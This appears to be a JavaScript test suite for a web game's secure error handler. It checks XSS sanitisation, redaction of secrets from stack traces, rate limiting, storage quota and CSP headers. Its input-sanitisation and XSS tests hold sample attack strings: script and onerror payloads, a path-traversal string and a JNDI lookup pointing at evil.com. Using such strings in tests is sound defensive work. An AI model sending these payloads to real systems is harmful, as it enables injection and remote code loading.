/**
 * Security Validation Test Suite
 * Tests all security measures implemented in the error handling system
 */

import { secureErrorHandler } from '../utils/SecureErrorHandler.js';
import { secureErrorDisplay } from '../utils/SecureErrorDisplay.js';

class SecurityValidation {
    constructor() {
        this.testResults = [];
        this.passed = 0;
        this.failed = 0;
    }

    /**
     * Run all security tests
     */
    async runAllTests() {
        console.log('🛡️ Starting Security Validation Test Suite...');
        
        await this.testXSSProtection();
        await this.testSensitiveDataRemoval();
        await this.testRateLimiting();
        await this.testStorageQuotaManagement();
        await this.testCSPHeaders();
        await this.testInputSanitization();
        await this.testErrorConsolidation();
        
        this.showResults();
        return this.generateReport();
    }

    /**
     * Test XSS protection in error messages
     */
    async testXSSProtection() {
        console.log('🧪 Testing XSS Protection...');
        
        try {
            // Test malicious script injection
            const maliciousScript = '<script>alert("XSS")</script>';
            const maliciousHTML = '<img src=x onerror=alert("XSS")>';
            const maliciousEvent = 'javascript:alert("XSS")';
            
            // Capture errors with XSS payloads
            secureErrorHandler.captureError(
                new Error(maliciousScript),
                'xss_test',
                { extraData: maliciousHTML }
            );
            
            secureErrorHandler.captureError(
                new Error(maliciousEvent),
                'xss_test_2'
            );
            
            // Check if errors were sanitized
            const errors = secureErrorHandler.getErrors(5);
            const xssErrors = errors.filter(err => err.source.includes('xss_test'));
            
            let xssBlocked = true;
            xssErrors.forEach(error => {
                if (error.message.includes('<script>') || 
                    error.message.includes('onerror=') ||
                    error.message.includes('javascript:')) {
                    xssBlocked = false;
                }
            });
            
            this.addResult('XSS Protection', xssBlocked, 
                xssBlocked ? 'XSS payloads properly sanitized' : 'XSS payloads not sanitized');
        } catch (error) {
            this.addResult('XSS Protection', false, `Test failed: ${error.message}`);
        }
    }

    /**
     * Test sensitive information removal
     */
    async testSensitiveDataRemoval() {
        console.log('🧪 Testing Sensitive Data Removal...');
        
        try {
            // Create error with sensitive file paths
            const sensitiveError = new Error('Test error');
            sensitiveError.stack = `
                Error: Test error
                    at /home/user/secret/passwords.js:42:13
                    at /Users/admin/Documents/api_keys.js:15:8
                    at C:\\Users\\Administrator\\Desktop\\secrets.js:33:5
                    at password="secret123" in config.js:10:1
                    at token="abc123xyz" in auth.js:25:3
            `;
            
            secureErrorHandler.captureError(sensitiveError, 'sensitive_test');
            
            // Check if sensitive data was removed
            const errors = secureErrorHandler.getErrors(5);
            const sensitiveTest = errors.find(err => err.source === 'sensitive_test');
            
            let sensitiveDataRemoved = true;
            if (sensitiveTest && sensitiveTest.stack) {
                const stack = sensitiveTest.stack;
                if (stack.includes('/home/user/') ||
                    stack.includes('/Users/admin/') ||
                    stack.includes('C:\\\\Users\\\\Administrator\\\\') ||
                    stack.includes('password=') ||
                    stack.includes('token=')) {
                    sensitiveDataRemoved = false;
                }
            }
            
            this.addResult('Sensitive Data Removal', sensitiveDataRemoved,
                sensitiveDataRemoved ? 'Sensitive data properly redacted' : 'Sensitive data not redacted');
        } catch (error) {
            this.addResult('Sensitive Data Removal', false, `Test failed: ${error.message}`);
        }
    }

    /**
     * Test rate limiting functionality
     */
    async testRateLimiting() {
        console.log('🧪 Testing Rate Limiting...');
        
        try {
            // Clear errors first
            const initialErrorCount = secureErrorHandler.errors.length;
            
            // Generate many errors quickly
            const startTime = Date.now();
            let capturedCount = 0;
            
            for (let i = 0; i < 25; i++) { // Exceed the rate limit
                const captured = secureErrorHandler.captureError(
                    new Error(`Rate limit test ${i}`),
                    'rate_limit_test'
                );
                if (captured) capturedCount++;
                
                // Small delay to stay within the same time window
                await new Promise(resolve => setTimeout(resolve, 10));
            }
            
            const rateLimitWorking = capturedCount < 25; // Should be less than 25 due to rate limiting
            
            this.addResult('Rate Limiting', rateLimitWorking,
                rateLimitWorking ? `Rate limiting active (${capturedCount}/25 errors captured)` : 
                'Rate limiting not working');
        } catch (error) {
            this.addResult('Rate Limiting', false, `Test failed: ${error.message}`);
        }
    }

    /**
     * Test storage quota management
     */
    async testStorageQuotaManagement() {
        console.log('🧪 Testing Storage Quota Management...');
        
        try {
            const initialUsage = secureErrorHandler.getStorageUsage();
            
            // Generate large error data
            const largeStack = 'Large error stack\\n'.repeat(1000);
            
            for (let i = 0; i < 10; i++) {
                const largeError = new Error(`Large error ${i}`);
                largeError.stack = largeStack;
                secureErrorHandler.captureError(largeError, 'quota_test');
            }
            
            const finalUsage = secureErrorHandler.getStorageUsage();
            const quotaManaged = finalUsage < secureErrorHandler.storageQuotaLimit;
            
            this.addResult('Storage Quota Management', quotaManaged,
                quotaManaged ? `Storage within limits (${(finalUsage/1024).toFixed(1)}KB)` : 
                'Storage quota exceeded');
        } catch (error) {
            this.addResult('Storage Quota Management', false, `Test failed: ${error.message}`);
        }
    }

    /**
     * Test CSP headers implementation
     */
    async testCSPHeaders() {
        console.log('🧪 Testing CSP Headers...');
        
        try {
            // Check if CSP meta tags are present in the document
            const cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
            const xssProtectionMeta = document.querySelector('meta[http-equiv="X-XSS-Protection"]');
            const frameOptionsMeta = document.querySelector('meta[http-equiv="X-Frame-Options"]');
            
            const cspImplemented = !!(cspMeta && xssProtectionMeta && frameOptionsMeta);
            
            let cspContent = '';
            if (cspMeta) {
                cspContent = cspMeta.getAttribute('content');
            }
            
            // Check CSP directive strictness
            const hasStrictCSP = cspContent.includes('object-src \'none\'') &&
                                cspContent.includes('base-uri \'self\'') &&
                                cspContent.includes('form-action \'self\'');
            
            this.addResult('CSP Headers', cspImplemented && hasStrictCSP,
                cspImplemented ? 'CSP headers properly implemented' : 'CSP headers missing or weak');
        } catch (error) {
            this.addResult('CSP Headers', false, `Test failed: ${error.message}`);
        }
    }

    /**
     * Test input sanitization
     */
    async testInputSanitization() {
        console.log('🧪 Testing Input Sanitization...');
        
        try {
            const testInputs = [
                '<>&"\\'/',
                'javascript:void(0)',
                'data:text/html,<script>alert(1)</script>',
                '../../etc/passwd',
                '${jndi:ldap://evil.com/a}'
            ];
            
            let allSanitized = true;
            
            testInputs.forEach(input => {
                const sanitized = secureErrorHandler.sanitizeText(input);
                if (sanitized === input || sanitized.includes('<script') || sanitized.includes('javascript:')) {
                    allSanitized = false;
                }
            });
            
            this.addResult('Input Sanitization', allSanitized,
                allSanitized ? 'All inputs properly sanitized' : 'Some inputs not sanitized');
        } catch (error) {
            this.addResult('Input Sanitization', false, `Test failed: ${error.message}`);
        }
    }

    /**
     * Test error handler consolidation
     */
    async testErrorConsolidation() {
        console.log('🧪 Testing Error Handler Consolidation...');
        
        try {
            // Check if old error handlers have been replaced
            const hasOldErrorOverlay = document.getElementById('error-overlay');
            const hasOldErrorList = document.getElementById('error-list');
            const hasSecureOverlay = document.getElementById('secure-error-overlay');
            
            // Check if multiple error storage keys exist (should be consolidated)
            let legacyKeys = 0;
            ['emergency_errors', 'game_errors_latest', 'game_errors_persistent', 'comandind_errors'].forEach(key => {
                if (localStorage.getItem(key)) legacyKeys++;
            });
            
            const hasSecureStorage = localStorage.getItem('secure_errors_data');
            const consolidated = !hasOldErrorOverlay && !hasOldErrorList && legacyKeys === 0;
            
            this.addResult('Error Handler Consolidation', consolidated,
                consolidated ? 'Error handlers successfully consolidated' : 'Legacy error handlers still active');
        } catch (error) {
            this.addResult('Error Handler Consolidation', false, `Test failed: ${error.message}`);
        }
    }

    /**
     * Add test result
     */
    addResult(testName, passed, details) {
        this.testResults.push({
            test: testName,
            passed,
            details,
            timestamp: new Date().toISOString()
        });
        
        if (passed) {
            this.passed++;
            console.log(`✅ ${testName}: ${details}`);
        } else {
            this.failed++;
            console.log(`❌ ${testName}: ${details}`);
        }
    }

    /**
     * Show test results
     */
    showResults() {
        console.log(`\\n🛡️ Security Validation Results:`);
        console.log(`✅ Passed: ${this.passed}`);
        console.log(`❌ Failed: ${this.failed}`);
        console.log(`📊 Total: ${this.testResults.length}`);
        console.log(`🎯 Success Rate: ${((this.passed / this.testResults.length) * 100).toFixed(1)}%\\n`);
        
        // Show detailed results
        this.testResults.forEach(result => {
            const icon = result.passed ? '✅' : '❌';
            console.log(`${icon} ${result.test}: ${result.details}`);
        });
    }

    /**
     * Generate comprehensive security report
     */
    generateReport() {
        const report = {
            timestamp: new Date().toISOString(),
            summary: {
                totalTests: this.testResults.length,
                passed: this.passed,
                failed: this.failed,
                successRate: ((this.passed / this.testResults.length) * 100).toFixed(1)
            },
            tests: this.testResults,
            recommendations: this.generateRecommendations(),
            securityLevel: this.assessSecurityLevel()
        };
        
        return report;
    }

    /**
     * Generate security recommendations
     */
    generateRecommendations() {
        const recommendations = [];
        
        this.testResults.forEach(result => {
            if (!result.passed) {
                switch (result.test) {
                    case 'XSS Protection':
                        recommendations.push('Implement stronger XSS sanitization for error messages');
                        break;
                    case 'Sensitive Data Removal':
                        recommendations.push('Enhance sensitive data detection patterns');
                        break;
                    case 'Rate Limiting':
                        recommendations.push('Adjust rate limiting parameters or implementation');
                        break;
                    case 'Storage Quota Management':
                        recommendations.push('Implement more aggressive storage cleanup');
                        break;
                    case 'CSP Headers':
                        recommendations.push('Strengthen Content Security Policy headers');
                        break;
                    case 'Input Sanitization':
                        recommendations.push('Improve input sanitization functions');
                        break;
                    case 'Error Handler Consolidation':
                        recommendations.push('Complete migration from legacy error handlers');
                        break;
                }
            }
        });
        
        if (recommendations.length === 0) {
            recommendations.push('All security measures are properly implemented');
        }
        
        return recommendations;
    }

    /**
     * Assess overall security level
     */
    assessSecurityLevel() {
        const successRate = (this.passed / this.testResults.length) * 100;
        
        if (successRate >= 95) return 'EXCELLENT';
        if (successRate >= 85) return 'GOOD';
        if (successRate >= 70) return 'ADEQUATE';
        if (successRate >= 50) return 'POOR';
        return 'CRITICAL';
    }
}

// Make available globally for testing
window.SecurityValidation = SecurityValidation;

// Auto-run tests when loaded
if (typeof window !== 'undefined') {
    window.addEventListener('load', async () => {
        // Wait for error handlers to initialize
        setTimeout(async () => {
            const validator = new SecurityValidation();
            const report = await validator.runAllTests();
            
            // Store report for later access
            window.securityReport = report;
            
            console.log('\\n🛡️ Security Validation Complete!');
            console.log('Access detailed report via: window.securityReport');
        }, 2000);
    });
}

export default SecurityValidation;